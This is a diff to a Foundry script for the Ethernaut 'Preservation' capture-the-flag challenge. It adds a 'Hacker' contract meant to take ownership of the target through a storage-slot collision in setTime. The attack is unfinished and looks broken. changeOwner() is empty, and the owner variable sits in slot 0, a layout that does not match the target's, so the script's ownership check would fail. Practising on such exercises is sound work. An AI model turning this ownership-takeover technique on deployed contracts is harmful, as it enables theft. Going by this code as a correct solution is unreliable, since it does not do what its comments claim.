@@ -19,14 +19,15 @@ contract PreservationSolution is Script, EthernautHelper {
         ////////////////////////////////////////////////////////////////////////////////////
         // Start of Ric Li C's Solution
         ////////////////////////////////////////////////////////////////////////////////////
-        // Step 1: Get Preservation contract;
-        Preservation preservation = Preservation(challengeInstance);
+        // Step 1: Get Hacker contract;
+        Hacker hacker = new Hacker(challengeInstance);
 
-        // Step 2: Call `XXXXX()` function of Preservation contract,
-        //         YYYYY;
+        // Step 2: Call `changeOwner()` function of Hacker contract,
+        hacker.changeOwner();
 
         // Step 3: Confirm that caller `heroAddress` has successfully obtained ownership of the Preservation contract.
         address heroAddress = vm.addr(heroPrivateKey);
+        Preservation preservation = Preservation(challengeInstance);
         require(heroAddress == preservation.owner(), "Owner check failed");
 
         ////////////////////////////////////////////////////////////////////////////////////
@@ -41,3 +42,25 @@ contract PreservationSolution is Script, EthernautHelper {
         console2.log(successMessage(16));
     }
 }
+
+////////////////////////////////////////////////////////////////////////////////////
+// Start of Ric Li C's Solution (Extra Contract)
+// Additional contract codes to help solve this puzzle
+////////////////////////////////////////////////////////////////////////////////////
+contract Hacker {
+    address owner;
+    address contractAddress;
+
+    constructor(address ctrAddress) {
+        contractAddress = ctrAddress;
+    }
+
+    function changeOwner() external {}
+
+    function setTime(uint time) external {
+        owner = address(uint160(time));
+    }
+}
+////////////////////////////////////////////////////////////////////////////////////
+// End of Ric Li C's Solution (Extra Contract)
+////////////////////////////////////////////////////////////////////////////////////
